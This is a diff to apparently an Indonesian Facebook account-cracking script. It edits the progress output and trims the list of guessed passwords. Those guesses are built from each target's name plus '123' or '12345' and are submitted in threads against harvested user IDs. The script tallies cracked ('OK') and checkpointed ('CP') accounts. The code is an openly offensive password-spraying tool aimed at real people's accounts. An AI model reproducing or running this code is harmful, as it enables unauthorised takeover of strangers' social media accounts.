@@ -722,7 +722,7 @@ class __crack__:
 
     def __api__(self, user, __yan__):
         global ok,cp,loop
-        sys.stdout.write('\r%s[>_%sCrack][%s/%s][OK:%s%s][CP:%s] '%(O,N,loop,len(self.id),len(ok),len(cp))),
+        sys.stdout.write('\r%s[++][%sCrack][%s/%s][OK:%s%s][CP:%s] '%(O,N,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
         for pw in __yan__:
             pw = pw.lower()
@@ -773,7 +773,7 @@ class __crack__:
     
     def __api__(self, user, __yan__):
         global ok,cp,loop
-        sys.stdout.write('\r%s[>_%sCrack][%s/%s][OK:%s][CP:%s] '%(O,N,loop,len(self.id),len(ok),len(cp))),
+        sys.stdout.write('\r%s[++][%sCrack][%s/%s][OK:%s%s][CP:%s] '%(O,N,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
         for pw in __yan__:
             pw = pw.lower()
@@ -824,7 +824,7 @@ class __crack__:
     
     def __mbasic__(self, user, __yan__):
         global ok,cp,loop
-        sys.stdout.write('\r%s[>_%sCrack][%s/%s][OK:%s][CP:%s] '%(O,N,loop,len(self.id),len(ok),len(cp))),
+        sys.stdout.write('\r%s[++][%sCrack][%s/%s][OK:%s%s][CP:%s] '%(O,N,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
         for pw in __yan__:
             pw = pw.lower()
@@ -875,7 +875,7 @@ class __crack__:
     
     def __mbasic__(self, user, __yan__):
         global ok,cp,loop
-        sys.stdout.write('\r%s[>_%sCrack][%s/%s][OK:%s][CP:%s] '%(O,N,loop,len(self.id),len(ok),len(cp))),
+        sys.stdout.write('\r%s[++][%sCrack][%s/%s][OK:%s%s][CP:%s] '%(O,N,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
         for pw in __yan__:
             pw = pw.lower()
@@ -926,7 +926,7 @@ class __crack__:
         
     def __mfb__(self, user, __yan__):
         global ok,cp,loop
-        sys.stdout.write('\r%s[>_%sCrack][%s/%s][OK:%s][CP:%s] '%(O,N,loop,len(self.id),len(ok),len(cp))),
+        sys.stdout.write('\r%s[++][%sCrack][%s/%s][OK:%s%s][CP:%s] '%(O,N,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
         for pw in __yan__:
             pw = pw.lower()
@@ -991,9 +991,9 @@ class __crack__:
                         uid, name = yntkts.split('<=>')
                         xz = name.split(' ')
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                            pwx = [name, xz[0]+"123", xz[0]+"12345", "katasandi"]
+                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                         else:
-                            pwx = [name, xz[0]+"123", xz[0]+"12345", "katasandi"]
+                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                         __yayanXD__.submit(self.__api__, uid, pwx)
                     except:
                         pass
@@ -1011,9 +1011,9 @@ class __crack__:
                         uid, name = yntkts.split('<=>')
                         xz = name.split(' ')
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                            pwx = [name, xz[0]+"123", xz[0]+"12345", "katasandi"]
+                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                         else:
-                            pwx = [name, xz[0]+"123", xz[0]+"12345", "katasandi"]
+                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                         __yayanXD__.submit(self.__mbasic__, uid, pwx)
                     except:
                         pass
@@ -1031,9 +1031,9 @@ class __crack__:
                         uid, name = yntkts.split('<=>')
                         xz = name.split(' ')
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                            pwx = [name, xz[0]+"123", xz[0]+"12345", "katasandi"]
+                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                         else:
-                            pwx = [name, xz[0]+"123", xz[0]+"12345", "katasandi"]
+                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                         __yayanXD__.submit(self.__mfb__, uid, pwx)
                     except:
                         pass
@@ -1051,9 +1051,9 @@ class __crack__:
                         uid, name = yntkts.split('<=>')
                         xz = name.split(' ')
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                            pwx = [name, xz[0]+"123", xz[0]+"12345", "katasandi"]
+                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                         else:
-                            pwx = [name, xz[0]+"123", xz[0]+"12345", "katasandi"]
+                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                         __yayanXD__.submit(self.__mfb__, uid, pwx)
                     except:
                         pass
@@ -1071,9 +1071,9 @@ class __crack__:
                         uid, name = yntkts.split('<=>')
                         xz = name.split(' ')
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                            pwx = [name, xz[0]+"123", xz[0]+"12345", "katasandi"]
+                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                         else:
-                            pwx = [name, xz[0]+"123", xz[0]+"12345", "katasandi"]
+                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                         __yayanXD__.submit(self.__mfb__, uid, pwx)
                     except:
                         pass
